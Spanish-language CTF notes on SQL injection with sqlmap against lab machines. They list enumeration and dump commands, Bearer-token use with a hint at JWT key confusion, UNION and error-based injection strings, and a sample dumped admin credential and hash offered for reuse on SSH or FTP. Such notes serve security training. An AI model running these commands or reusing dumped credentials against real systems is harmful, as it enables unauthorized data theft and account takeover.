# Inyección SQL con sqlmap

Comandos usados en las máquinas **Vaucher**, **BOLA** y **boda**.

## 1. Base de datos

```
sqlmap -u "http://<IP>/ruta?q=1" --forms --dbms=mysql --dump
```

- `-u` → URL objetivo (si tiene `?param=`, sqlmap lo prueba).
- `--forms` → analiza también los formularios HTML.
- `--dbms=mysql` → fuerza el motor de base de datos (ahorra tiempo).
- `--dump` → vuelca las tablas encontradas.
- `--batch` → responde «sí» a todas las preguntas (imprescindible en scripts/repeticiones).

## 2. Recorrer la base de datos paso a paso

Listar bases de datos:

```
sqlmap --url "http://<IP>/api/courses.php?q=1" --dbs --batch
```

Listar tablas de una base:

```
sqlmap --url "http://<IP>/api/courses.php?q=1" -D academy_ctf --tables --batch
```

Listar columnas de una tabla:

```
sqlmap --url "http://<IP>/api/courses.php?q=1" -D academy_ctf -T flags --columns --no-cast --batch
```

Volcar columnas concretas:

```
sqlmap --url "http://<IP>/api/courses.php?q=1" -D academy_ctf -T flags -C name,flag_value --dump --no-cast --batch
```

- `--no-cast` → evita conversiones de tipo que pueden corromper los datos.

## 3. API con autenticación (JWT / Bearer)

Si la petición necesita un token, se pasa con `--headers` para que sqlmap lo reutilice:

```
sqlmap -u "http://<IP>/api/courses.php?q=1" \
  --headers="Authorization: Bearer <TOKEN>" \
  --dump --batch
```

El token se obtiene normalmente atacando el JWT (firma HS256 con clave pública) y comprobándolo con `curl` antes de pasárselo a sqlmap.

## 4. Cadenas típicas que delatan SQLi

- Comentario: `1' -- -`
- Unión: `1' UNION SELECT null,null -- -`
- Error: `1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- -`

## 5. Resultados habituales

El volcado suele traer usuarios con contraseña en claro y su hash (por ejemplo bcrypt `$2y$10$...`), lo que permite reutilizar las credenciales en SSH, FTP o el propio login web:

```
usuario: admin
contraseña: admin123
hash: $2y$10$GgGK5MsjTbGrjqkTsLXCcOD0dui1zAXhTE72lDVB.c4igQQwHdP5a
```
